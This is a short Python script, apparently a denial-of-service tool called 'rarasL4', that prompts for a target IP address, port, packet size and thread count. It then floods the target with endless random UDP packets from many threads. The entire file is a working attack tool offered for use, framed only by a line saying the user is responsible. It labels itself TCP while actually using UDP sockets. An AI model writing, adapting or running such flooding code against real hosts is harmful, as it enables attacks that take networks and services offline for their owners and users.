import socket
import random
import time
import threading
import os


os.system("title rarasL4 Version 1 [TCP]")
os.system("CLS") # FOR WINDOWS
# os.system("CLEAR") # FOR LINUX
print("Dev: Creaminit [github.com/creaminit1234]")
print("Software version: 1.0")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("[RarasL4-V1]: Enter the target ip: ")
port = int(input("[RarasL4-V1]: Enter the port: "))
packSize = input("[RarasL4-V1]: Enter the packet size in bytes [Max: 65000]: ")
threadsCount = int(input("Enter amount of threads: "))
print("[RarasL4-V1]: You cannot stop it without closing or k!lling this application")
duration = input("[RarasL4-V1]: PRESS RETURN TO START [By starting this you are responsible for all of your actions]: ")


packet = random._urandom(int(packSize))

print("starting to send packets [HHTV1.CONDITIONCODE 0x775034]")

def SendPack():
    while True:
        s.sendto(packet, (ip,port))


def threads():
    for i in range(threadsCount):
        t = threading.Thread(target=SendPack)
        t.start()

threads()